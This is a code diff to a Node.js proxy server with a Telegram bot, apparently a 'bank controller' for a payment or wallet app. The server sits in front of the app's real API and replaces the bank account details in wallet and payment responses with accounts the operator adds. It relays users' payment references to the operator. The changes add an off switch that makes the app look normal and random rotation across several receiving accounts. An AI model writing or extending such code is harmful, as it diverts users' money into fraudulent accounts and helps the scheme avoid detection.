@@ -26,7 +26,7 @@ async function ensureWebhook() {
   } catch (e) {}
 }
 
-const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null };
+const DEFAULT_DATA = { banks: [], activeIndex: -1, walletType: 'paytm', adminChatId: null, botEnabled: true, autoRotate: false, lastUsedIndex: -1 };
 
 async function loadData() {
   try {
@@ -44,8 +44,28 @@ async function saveData(data) {
 }
 
 function getActiveBank(d) {
+  if (d.autoRotate && d.banks.length > 0) {
+    if (d.banks.length === 1) return d.banks[0];
+    let nextIndex;
+    do {
+      nextIndex = Math.floor(Math.random() * d.banks.length);
+    } while (nextIndex === d.lastUsedIndex && d.banks.length > 1);
+    d.lastUsedIndex = nextIndex;
+    d._rotatedIndex = nextIndex;
+    return d.banks[nextIndex];
+  }
   if (d.activeIndex >= 0 && d.activeIndex < d.banks.length) return d.banks[d.activeIndex];
   return null;
+}
+
+async function getActiveBankAndSave(d) {
+  const bank = getActiveBank(d);
+  if (d.autoRotate && d._rotatedIndex !== undefined) {
+    d.lastUsedIndex = d._rotatedIndex;
+    delete d._rotatedIndex;
+    await saveData(d);
+  }
+  return bank;
 }
 
 function bankListText(d) {
@@ -147,6 +167,8 @@ app.post('/api/telegram', async (req, res) => {
         return res.sendStatus(200);
       }
       bankData.adminChatId = chatId;
+      if (bankData.botEnabled === undefined) bankData.botEnabled = true;
+      if (bankData.autoRotate === undefined) bankData.autoRotate = false;
       await saveData(bankData);
       await bot.sendMessage(chatId,
 `🏦 IMoney Bank Controller
@@ -157,6 +179,12 @@ app.post('/api/telegram', async (req, res) => {
 /deactivate
 /list
 /status
+
+/on - Bot ON (overlay + notifications)
+/off - Bot OFF (normal mode, no overlay)
+
+/rotate on - Auto rotate banks
+/rotate off - Use fixed bank
 
 Example:
 /addbank 1234567890 | Rahul Kumar | SBIN0001234
@@ -223,14 +251,56 @@ ${bank.accountNo} | ${bank.accountHolder} | ${bank.ifsc}`
       await bot.sendMessage(chatId, '🔴 All banks deactivated.');
     }
 
+    else if (text === '/on') {
+      bankData.botEnabled = true;
+      await saveData(bankData);
+      await bot.sendMessage(chatId, '🟢 Bot ON! Bank overlay + notifications active.');
+    }
+
+    else if (text === '/off') {
+      bankData.botEnabled = false;
+      await saveData(bankData);
+      await bot.sendMessage(chatId, '🔴 Bot OFF! No overlay, no notifications. App works normally.');
+    }
+
+    else if (text === '/rotate on') {
+      if (bankData.banks.length < 2) {
+        await bot.sendMessage(chatId, '❌ Add at least 2 banks for auto-rotate.');
+        return res.sendStatus(200);
+      }
+      bankData.autoRotate = true;
+      bankData.lastUsedIndex = -1;
+      await saveData(bankData);
+      await bot.sendMessage(chatId, `🔄 Auto-Rotate ON!\n${bankData.banks.length} banks in rotation. Every order will use a different bank.`);
+    }
+
+    else if (text === '/rotate off') {
+      bankData.autoRotate = false;
+      await saveData(bankData);
+      const active = getActiveBank(bankData);
+      await bot.sendMessage(chatId, `🔄 Auto-Rotate OFF!\nFixed bank: ${active ? active.accountHolder + ' | ' + active.accountNo : 'None (use /usebank)'}`);
+    }
+
     else if (text === '/list') {
-      await bot.sendMessage(chatId, `🏦 Banks:\n\n${bankListText(bankData)}`);
+      const rotateStatus = bankData.autoRotate ? '🔄 Auto-Rotate: ON' : '🔄 Auto-Rotate: OFF';
+      const botStatus = bankData.botEnabled !== false ? '🟢 Bot: ON' : '🔴 Bot: OFF';
+      await bot.sendMessage(chatId, `🏦 Banks:\n\n${bankListText(bankData)}\n\n${botStatus}\n${rotateStatus}`);
     }
 
     else if (text === '/status') {
+      const botOn = bankData.botEnabled !== false;
+      const rotate = bankData.autoRotate === true;
       const active = getActiveBank(bankData);
-      if (!active) { await bot.sendMessage(chatId, '🔴 No active bank.'); return res.sendStatus(200); }
-      await bot.sendMessage(chatId, `🟢 Active: ${active.accountNo} | ${active.accountHolder} | ${active.ifsc}`);
+      let msg = `📊 Status:\n\n`;
+      msg += `Bot: ${botOn ? '🟢 ON' : '🔴 OFF'}\n`;
+      msg += `Auto-Rotate: ${rotate ? '🔄 ON (' + bankData.banks.length + ' banks)' : '❌ OFF'}\n`;
+      msg += `Banks: ${bankData.banks.length}\n`;
+      if (active) {
+        msg += `\nCurrent Bank:\n${active.accountHolder} | ${active.accountNo} | ${active.ifsc}`;
+      } else {
+        msg += `\n⚠️ No active bank`;
+      }
+      await bot.sendMessage(chatId, msg);
     }
 
     return res.sendStatus(200);
@@ -242,7 +312,8 @@ ${bank.accountNo} | ${bank.accountHolder} | ${bank.ifsc}`
 
 app.get('/wallet/online/walletType', async (req, res) => {
   const bankData = await loadData();
-  const active = getActiveBank(bankData);
+  if (bankData.botEnabled === false) return await transparentProxy(req, res);
+  const active = await getActiveBankAndSave(bankData);
   if (active) {
     return res.json({
       code: 1,
@@ -260,6 +331,7 @@ app.get('/wallet/online/walletType', async (req, res) => {
 
 app.post('/money/uploadUtr', async (req, res) => {
   const bankData = await loadData();
+  if (bankData.botEnabled === false) return await transparentProxy(req, res);
   if (bankData.adminChatId && bot) {
     let b = req.parsedBody || {};
     const contentType = (req.headers['content-type'] || '').toLowerCase();
@@ -291,6 +363,7 @@ Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
 
 app.post('/money/cancelUtr', async (req, res) => {
   const bankData = await loadData();
+  if (bankData.botEnabled === false) return await transparentProxy(req, res);
   if (bankData.adminChatId && bot) {
     bot.sendMessage(bankData.adminChatId,
 `❌ UTR Cancelled!
@@ -303,7 +376,8 @@ Time: ${new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })}`
 
 async function proxyAndReplaceBankDetails(req, res, label) {
   const bankData = await loadData();
-  const active = getActiveBank(bankData);
+  if (bankData.botEnabled === false) return await transparentProxy(req, res);
+  const active = await getActiveBankAndSave(bankData);
 
   try {
     const url = ORIGINAL_API + req.originalUrl;
@@ -394,7 +468,8 @@ function replaceBankInObject(obj, active) {
 
 async function proxyAndReplaceBankInList(req, res) {
   const bankData = await loadData();
-  const active = getActiveBank(bankData);
+  if (bankData.botEnabled === false) return await transparentProxy(req, res);
+  const active = await getActiveBankAndSave(bankData);
 
   try {
     const url = ORIGINAL_API + req.originalUrl;
